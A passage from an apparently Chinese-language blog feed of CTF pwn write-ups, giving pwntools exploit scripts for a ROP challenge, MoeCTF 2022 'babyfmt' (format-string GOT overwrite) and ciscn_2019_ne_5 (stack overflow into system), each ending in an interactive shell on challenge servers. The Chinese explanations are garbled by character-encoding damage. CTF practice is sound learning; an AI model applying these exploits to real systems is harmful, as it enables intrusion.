class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;choice!\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(b&#x27;1&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(b&#x27;encrypted\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">Payload_2 = Padding + p64(ret) + p64(rdi) + p64(sh_addr) + p64(system_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(Payload_2)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"moectf-2022babyfmt\"><a class=\"anchor\" href=\"#moectf-2022babyfmt\">#</a> [MoeCTF 2022]babyfmt</h5>\n<p>æŸ¥çœ‹åˆ°è¿™ä¸ªé¢˜å¾ˆç®€å•çš„å¤„ç†æ–¹æ³•ï¼Œé‡Œé¢æœ‰ä¸ª printf (buf) å¯ä»¥ç›´æ¥åˆ¤æ–­ä¸ºå­—ç¬¦ä¸²æº¢å‡ºï¼Œæ²¡å¼€ FULLï¼ŒåŸºæœ¬æ€è·¯å°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²åŠ«æŒ got è¡¨ï¼Œæ‰¾åˆ°åç§»ä¹‹åè¯•äº†å‡ ç§ä¿®æ”¹ï¼Œæ”¹å‘å¯ä»¥è¯´æ˜¯å¤šç§å¤šæ ·äº†ã€‚æ¥æ”¶ backdoor æ²¡å•¥ç”¨ï¼Œå¯ä»¥æ”¹ got è¡¨ç›´æ¥ç”¨ system çš„ got è¡¨å°±è¡Œï¼Œå¦‚æœå¼€ FULL RELRO çš„è¯å¯ä»¥è¦†ç›– ret åœ°å€ï¼Œç»™çš„åœ°å€è¿˜æœ‰ç‚¹ç”¨</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class=\"line\">#p=process(&#x27;./pwn&#x27;)</span><br><span class=\"line\">p=remote(&#x27;node5.anna.nssctf.cn&#x27;,28523)</span><br><span class=\"line\">print_got=elf.got[&#x27;printf&#x27;]</span><br><span class=\"line\">p.recvuntil(&quot;\\n&quot;)</span><br><span class=\"line\">p.sendline(&quot;%10$s&quot;)</span><br><span class=\"line\">baskdoor=int(p.recv(9),16)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=fmtstr_payload(11,&#123;print_got:baskdoor&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"ciscn_2019_ne_5\"><a class=\"anchor\" href=\"#ciscn_2019_ne_5\">#</a> ciscn_2019_ne_5</h4>\n<blockquote>\n<p>æ³¨æ„ scanf é‡Œé¢ä¹Ÿç»™äº† sh å’Œ system ç›´æ¥æ‰“<br />\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">elf=ELF(&#x27;./ciscn_2019_ne_5&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">p=remote(&quot;node4.buuoj.cn&quot;,25421)</span><br><span class=\"line\"></span><br><span class=\"line\">#p=process(&quot;./ciscn_2019_ne_5&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(b&quot;password:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(b&quot;administrator&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">system=elf.sym[&#x27;system&#x27;]</span><br><span class=\"line\"></span><br><span class=\"line\">def add(text):</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.sendline(b&quot;1&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.recvuntil(b&quot;nfo:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.sendline(text)</span><br><span class=\"line\"></span><br><span class=\"line\">def et():</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.recvuntil(b&quot;:&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">Â  Â  p.sendline(b&quot;4&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=b&#x27;a&#x27;*(0x48+4)+p32(system)+b&#x27;\\x01\\x01\\x01\\x01&#x27;+p32(0x80482ea)</span><br><span class=\"line\"></span><br><span class=\"line\">add(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">et()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n",
            "tags": [
                "PWN"
            ]
        }
    ]
}